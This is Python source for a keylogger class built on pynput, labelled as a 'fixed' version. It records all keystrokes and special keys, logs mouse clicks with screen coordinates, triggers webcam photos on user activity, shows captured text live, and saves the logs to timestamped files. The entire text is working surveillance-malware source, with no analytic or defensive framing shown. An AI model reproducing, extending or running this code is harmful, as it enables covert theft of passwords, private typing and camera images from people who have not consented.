# ============ FIXED KEYLOGGER CLASS ============
class KeyloggerGUI:
    def __init__(self, parent, config, log_callback, photo_capture=None):
        self.parent = parent
        self.config = config
        self.log_callback = log_callback
        self.photo_capture = photo_capture
        self.running = False
        self.keys = []
        self.mouse_events = []
        self.keyboard_listener = None
        self.mouse_listener = None
        
    def on_press(self, key):
        try:
            self.keys.append(key.char)
        except AttributeError:
            if key == pynput_keyboard.Key.space:
                self.keys.append('[SPACE]')
            elif key == pynput_keyboard.Key.enter:
                self.keys.append('[ENTER]\n')
            elif key == pynput_keyboard.Key.backspace:
                self.keys.append('[BACKSPACE]')
            elif key == pynput_keyboard.Key.tab:
                self.keys.append('[TAB]')
            elif key == pynput_keyboard.Key.esc:
                self.keys.append('[ESC]')
            elif key == pynput_keyboard.Key.shift:
                self.keys.append('[SHIFT]')
            elif key == pynput_keyboard.Key.shift_r:
                self.keys.append('[SHIFT_R]')
            elif key == pynput_keyboard.Key.ctrl_l:
                self.keys.append('[CTRL]')
            elif key == pynput_keyboard.Key.ctrl_r:
                self.keys.append('[CTRL_R]')
            elif key == pynput_keyboard.Key.alt_l:
                self.keys.append('[ALT]')
            elif key == pynput_keyboard.Key.alt_r:
                self.keys.append('[ALT_R]')
            elif key == pynput_keyboard.Key.alt_gr:
                self.keys.append('[ALT_GR]')
            elif key == pynput_keyboard.Key.cmd:
                self.keys.append('[WINDOW_KEY]')
            elif key == pynput_keyboard.Key.cmd_r:
                self.keys.append('[WINDOW_KEY_R]')
            elif key == pynput_keyboard.Key.caps_lock:
                self.keys.append('[CAPSLOCK]')
            elif key == pynput_keyboard.Key.delete:
                self.keys.append('[DELETE]')
            elif key == pynput_keyboard.Key.insert:
                self.keys.append('[INSERT]')
            elif key == pynput_keyboard.Key.home:
                self.keys.append('[HOME]')
            elif key == pynput_keyboard.Key.end:
                self.keys.append('[END]')
            elif key == pynput_keyboard.Key.page_up:
                self.keys.append('[PAGE_UP]')
            elif key == pynput_keyboard.Key.page_down:
                self.keys.append('[PAGE_DOWN]')
            elif key == pynput_keyboard.Key.up:
                self.keys.append('[UP_ARROW]')
            elif key == pynput_keyboard.Key.down:
                self.keys.append('[DOWN_ARROW]')
            elif key == pynput_keyboard.Key.left:
                self.keys.append('[LEFT_ARROW]')
            elif key == pynput_keyboard.Key.right:
                self.keys.append('[RIGHT_ARROW]')
            elif key == pynput_keyboard.Key.f1:
                self.keys.append('[F1]')
            elif key == pynput_keyboard.Key.f2:
                self.keys.append('[F2]')
            elif key == pynput_keyboard.Key.f3:
                self.keys.append('[F3]')
            elif key == pynput_keyboard.Key.f4:
                self.keys.append('[F4]')
            elif key == pynput_keyboard.Key.f5:
                self.keys.append('[F5]')
            elif key == pynput_keyboard.Key.f6:
                self.keys.append('[F6]')
            elif key == pynput_keyboard.Key.f7:
                self.keys.append('[F7]')
            elif key == pynput_keyboard.Key.f8:
                self.keys.append('[F8]')
            elif key == pynput_keyboard.Key.f9:
                self.keys.append('[F9]')
            elif key == pynput_keyboard.Key.f10:
                self.keys.append('[F10]')
            elif key == pynput_keyboard.Key.f11:
                self.keys.append('[F11]')
            elif key == pynput_keyboard.Key.f12:
                self.keys.append('[F12]')
            else:
                self.keys.append(f'[{key}]')
        
        # Real-time log display
        if self.keys:
            log_text = ''.join(self.keys[-50:])
            self.log_callback(log_text)
        
        # Capture photo on key press
        if self.photo_capture and self.photo_capture.config['camera']['capture_on_activity']:
            current_time = time.time()
            if current_time - self.photo_capture.last_capture_time >= self.photo_capture.config['camera']['capture_interval']:
                threading.Thread(target=self.photo_capture.capture_photo).start()
    
    def on_click(self, x, y, button, pressed):
        action = "clicked" if pressed else "released"
        msg = f"[MOUSE_{action.upper()}] at ({x}, {y}) with {button}"
        self.mouse_events.append(msg)
        self.log_callback(msg)
        
        if self.photo_capture and self.photo_capture.config['camera']['capture_on_activity']:
            threading.Thread(target=self.photo_capture.capture_photo).start()
    
    def start(self):
        self.running = True
        self.keyboard_listener = pynput_keyboard.Listener(on_press=self.on_press)
        self.keyboard_listener.start()
        
        if self.config['keylogger']['log_mouse']:
            self.mouse_listener = mouse.Listener(on_click=self.on_click)
            self.mouse_listener.start()
    
    def stop(self):
        self.running = False
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()
        
        filename = f"{self.config['keylogger']['save_path']}/keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"Keylog saved at: {datetime.now()}\n")
            f.write(''.join(self.keys))
            f.write('\n\n' + '\n'.join(self.mouse_events))
        return filename
